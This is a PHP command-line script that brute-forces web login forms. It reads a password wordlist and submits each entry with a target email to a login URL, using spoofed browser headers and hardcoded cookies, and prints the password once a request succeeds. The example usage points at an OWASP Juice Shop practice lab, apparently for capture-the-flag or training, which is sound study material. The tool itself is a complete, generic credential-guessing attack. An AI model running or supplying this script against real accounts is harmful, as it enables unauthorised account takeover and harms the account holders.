<?php

$local_args = [
    "--wordlist" => false,
    "--url" => false,
    "--json" => false,
    "--email" => false,
    "--v" => false
];

if(count($argv) > 1) {
    for($i = 1; $i < count($argv); $i++){
        $tmp = explode("=", $argv[$i]);
        if(array_key_exists($tmp[0], $local_args)) {
            $local_args[$tmp[0]] = $tmp[1];
        }        
    }    
}

if(
    !$local_args["--wordlist"] ||
    !$local_args["--url"] ||
    !$local_args["--email"]
    ){
        echo "You need to provide the --wordlist, --url and --email as minumum.\n";
        echo "Example: passwd_brute.php --wordlist=/usr/share/seclists/Passwords/Common-Credentials/best1050.txt --json=true --url=http://10.10.32.195/rest/user/login --email=admin@juice-sh.op --v=true\n";
        exit;
    }



$wordlist = $local_args["--wordlist"];

$c = 0;

try{
    if (file_exists($wordlist) && $file = fopen($wordlist, "r")) {
        while(!feof($file)) {
            $psswd = trim(fgets($file));

            if($local_args['--v']) {
                echo ++$c . " - Trying: " . $psswd . "\n";
            }

            if( $result = post_request($local_args["--url"], ["email"=>$local_args["--email"],"password"=>$psswd], $local_args["--json"] )) {
                echo $result;
                break;
            }          
        }
        fclose($file);
    } else {
        throw new Exception("Wordlist file not found or read protected.....\n" . $wordlist . "\n\n" , 1);        
    }
} catch(Exception $e) {
    echo "Message: " . $e->getMessage();
    echo "";
    echo "getCode(): " . $e->getCode();
    echo "";
    echo "__toString(): " . $e->__toString();
}

/**
 * post_request
 *
 * @param  mixed $url
 * @param  mixed $params
 * @param  mixed $json_encode
 * @return void
 */
function post_request($url, array $params, $json_encode = false) {
    
    $parsed_url = parse_url($url);

    if(!$json_encode) {
        // use this for 'Content-type: application/x-www-form-urlencoded',
        $content = http_build_query($params);
    } else {
        //use this for 'Content-Type: application/json'
        $content = json_encode($params);
    }

    $req = [
        'http' => [
            'header'  => [ // header array does not need '\r\n'
                $json_encode ? 'Content-Type: application/json' : 'Content-type: application/x-www-form-urlencoded',
                'Host: ' . $parsed_url['host'],
                'Accept-Language: en-US,en;q=0.5',
                'Accept-Encoding: gzip, deflate',
                'Accept: application/json, text/plain, */*',
                'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Content-Length: ' . strlen($content),
                'Origin: ' . $parsed_url['host'],
                'Cookie: io=5NClLy2aB1zEuoKgAAAd; language=en; continueCode=Pwma6XxDOa3kY5bEJRzoqLnyBWpd9qiQdKeMNmr8P1lv4w9VjZ2g7Q6g4Rzx',
                'Referer: ' . $parsed_url['scheme'] . '://' . $parsed_url['host'] . '/',
                'DNT: 1'
            ],
            'method'  => 'POST',
            'content' => $content
        ]
    ];

    @$fp = fopen(
        $url, 
        'r', 
        FALSE, // do not use_include_path
        stream_context_create($req)
    );

    if ($fp) {        
        $result = "\n\n ******* THE PASSWORD IS: " . $params['password'] . " ******* \n" . stream_get_contents($fp); // no maxlength/offset
        fclose($fp);
        return $result;
    }    

    return false;
}